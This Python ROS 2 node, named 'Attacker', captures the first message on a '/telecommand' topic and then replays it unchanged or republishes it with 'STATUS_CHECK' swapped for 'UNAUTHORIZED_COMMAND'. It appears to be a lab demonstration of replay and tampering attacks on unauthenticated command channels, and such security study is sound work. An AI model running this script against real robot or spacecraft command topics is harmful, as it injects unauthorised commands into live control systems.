import rclpy
from rclpy.node import Node
from std_msgs.msg import String


class Attacker(Node):
    def __init__(self):
        super().__init__('attacker')

        self.publisher = self.create_publisher(
            String,
            '/telecommand',
            10
        )

        self.subscription = self.create_subscription(
            String,
            '/telecommand',
            self.receive_message,
            10
        )

        self.first_message = None

        self.declare_parameter('mode', 'replay')
        self.declare_parameter('delay_s', 15.0)

        self.mode = self.get_parameter('mode').value
        self.delay_s = self.get_parameter('delay_s').value

        self.timer = None

        self.get_logger().info(
            f'Attacker started: mode={self.mode}, delay={self.delay_s}s'
        )

    def receive_message(self, msg):
        if self.first_message is not None:
            return

        self.first_message = msg.data

        self.get_logger().info('Captured first telecommand')

        self.timer = self.create_timer(
            float(self.delay_s),
            self.attack
        )

    def attack(self):
        if self.first_message is None:
            return

        msg = String()

        if self.mode == 'replay':
            msg.data = self.first_message
            self.get_logger().info('Replaying captured message')

        elif self.mode == 'tamper':
            msg.data = self.first_message.replace(
                'STATUS_CHECK',
                'UNAUTHORIZED_COMMAND'
            )
            self.get_logger().info('Tampering with captured message')

        else:
            self.get_logger().error(f'Unknown mode: {self.mode}')
            return

        self.publisher.publish(msg)

        if self.timer is not None:
            self.timer.cancel()


def main(args=None):
    rclpy.init(args=args)

    node = Attacker()

    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
